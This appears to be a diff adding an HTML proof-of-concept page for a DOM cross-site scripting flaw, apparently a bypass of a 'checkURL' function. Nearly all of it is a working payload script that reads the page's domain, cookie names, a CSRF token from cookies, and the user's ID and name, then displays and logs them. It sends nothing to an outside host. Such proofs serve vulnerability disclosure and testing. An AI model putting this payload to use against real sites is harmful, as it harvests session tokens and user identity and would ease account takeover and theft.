@@ -1,0 +1,26 @@
+<div id="xss-poc" style="display:none">
+  <h2>DOM XSS PoC - H2 checkURL Protocol-Relative Bypass</h2>
+  <p>If you see this alert, the vulnerability is confirmed.</p>
+</div>
+<script>
+  (function() {
+    var proof = {
+      domain: document.domain,
+      cookie_keys: document.cookie.split(';').map(function(c) { return c.trim().split('=')[0]; }),
+      csrf_token: (document.cookie.match(/X-CSRF-Token=([^;]+)/) || [])[1] || 'not found',
+      url: location.href,
+      user_id: (typeof pageData !== 'undefined' && pageData.userid) ? pageData.userid : 'N/A',
+      user_name: (typeof pageData !== 'undefined' && pageData.userName) ? pageData.userName : 'N/A',
+      timestamp: new Date().toISOString()
+    };
+    alert(
+      'DOM XSS via checkURL() bypass!\n\n' +
+      'Domain: ' + proof.domain + '\n' +
+      'User ID: ' + proof.user_id + '\n' +
+      'User: ' + proof.user_name + '\n' +
+      'CSRF Token: ' + proof.csrf_token + '\n' +
+      'Cookie Keys: ' + proof.cookie_keys.join(', ')
+    );
+    console.log('[H2-POC] DOM XSS Proof:', JSON.stringify(proof, null, 2));
+  })();
+</script>
